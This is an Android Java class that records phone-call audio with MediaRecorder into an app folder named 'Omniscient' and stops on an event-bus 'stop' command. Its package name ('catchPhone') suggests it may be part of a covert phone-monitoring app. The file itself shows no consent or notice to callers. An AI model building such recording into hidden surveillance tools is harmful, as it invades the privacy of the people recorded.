package com.postal.omniscient.postal.catchPhone.Call;

import android.content.Context;
import android.media.MediaRecorder;
import android.os.Environment;
import android.util.Log;

import com.postal.omniscient.postal.adapter.EventBusCall;
import com.postal.omniscient.postal.adapter.EventBusData;

import org.greenrobot.eventbus.EventBus;
import org.greenrobot.eventbus.Subscribe;
import org.greenrobot.eventbus.ThreadMode;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;

/**
 * Created by Александр on 02.08.2016.
 */
public class CallInThread extends Thread {

    public CallInThread(Context context, String in_out_Call, String folderName, String fileName){
        this.context = context;
        this.folderName = folderName;
        this.fileName = fileName;
        this.in_out_Call = in_out_Call;
    }

    private Context context;
    private String in_out_Call, folderName, fileName;
    private MediaRecorder recorder;
    private File audiofile;


    @Override
    public void run() {
        recordStart();
    }

    private void recordStart() {
        EventBus.getDefault().register(this);

        String time = new SimpleDateFormat("dd_MM_yyyy_HH-mm")
                .format(new Date());
        File sampleDir = new File(context.getFilesDir(), "/Omniscient/"+folderName);

        if (!sampleDir.exists()) {
            sampleDir.mkdirs();
        }
        String file_name = in_out_Call + "_" + time;
        try {
            audiofile = File.createTempFile(file_name, fileName, sampleDir);
        } catch (IOException e) {
            Log.i("MyMsg", "Eror T -1 " + e);
        }

        recorder = new MediaRecorder();

        recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.AMR_NB);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        recorder.setOutputFile(audiofile.getAbsolutePath());
        try {
            recorder.prepare();
        } catch (IllegalStateException e) {
            Log.i("MyMsg", "Eror T0 " + e);
        } catch (IOException e) {
            Log.i("MyMsg", "Eror T1 " + e);
        }
        recorder.start();

        Log.i("MyMsg", "Name on in_out_Call " + in_out_Call);
    }
    public void recordStop(){
        recorder.stop();
        Log.i("MyMsg", "call off");
        EventBus.getDefault().unregister(this);
    }


    @Subscribe(threadMode = ThreadMode.ASYNC)
    public void onEvent(EventBusCall event){
        String command = event.getComand();
        if(command.equals("stop")){
            recordStop();
            EventBus.getDefault().post(new EventBusData("call_off"));
        }
    }

}
